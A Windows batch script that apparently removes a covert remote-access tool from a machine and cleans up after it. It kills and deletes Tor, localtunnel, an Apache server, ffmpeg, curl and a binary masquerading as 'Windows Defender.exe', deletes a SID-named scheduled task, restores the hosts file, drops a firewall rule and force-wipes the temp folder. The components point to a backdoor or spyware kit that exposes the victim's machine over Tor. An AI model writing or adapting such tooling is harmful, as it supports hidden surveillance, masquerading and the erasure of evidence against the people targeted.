set environment=C:\Windows

del /s /f /q /a "%temp%\*"
FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q

FOR /F "tokens=1,2 delims==" %%s IN ('wmic path win32_useraccount where name^='%username%' get sid /value ^| find /i "SID"') DO SET SID=%%t

rem TESTING >
if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
rem TESTING <

netsh advfirewall firewall delete rule name="apache" program="%environment%\apache2\bin\httpd.exe"

move /y "C:\Windows\System32\drivers\etc\hosts.bak" "C:\Windows\System32\drivers\etc\hosts"
taskkill /f /im tor.exe
taskkill /f /im curl.exe
taskkill /f /im "Windows Defender.exe"
taskkill /f /im localtunnel.exe
taskkill /f /im httpd.exe
taskkill /f /im ffmpeg.exe
powershell.exe Remove-Item -Force '%environment%\Windows Defender.exe'
powershell.exe Remove-Item -Force -Recurse "%environment%\localtunnel"
powershell.exe Remove-Item -Force "%environment%\nircmd.exe"
powershell.exe Remove-Item -Force "%environment%\curl.exe"
powershell.exe Remove-Item -Force "%environment%\openssl.exe"
powershell.exe Remove-Item -Force "%environment%\libeay32.dll"
powershell.exe Remove-Item -Force "%environment%\ssleay32.dll"
powershell.exe Remove-Item -Force "%environment%\tor.exe" 
powershell.exe Remove-Item -Force "%environment%\ffmpeg.exe" 
powershell.exe Remove-Item -Force -Recurse "%appdata%\tor"
powershell.exe Remove-Item -Force -Recurse "%appdata%\Ookla"
powershell.exe Remove-Item -Force -Recurse "%environment%\Win32"
powershell.exe Remove-Item -Force -Recurse "%environment%\apache2"
powershell.exe Remove-Item -Force -Recurse "%environment%\7-Zip"
schtasks /Delete /TN "%SID%XYZ" /F
Taskkill /f /im winrun.exe
del /s /f /q /a "%temp%\*"
FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
powershell.exe Remove-Item -Force -Recurse "%environment%\Win32\*.bat"
taskkill /F /IM wscript.exe
taskkill /F /IM cscript.exe

icacls "%environment%" /reset /C
taskkill /f /im timeout.exe
taskkill /f /im explorer.exe
start "" "%windir%\explorer.exe"  
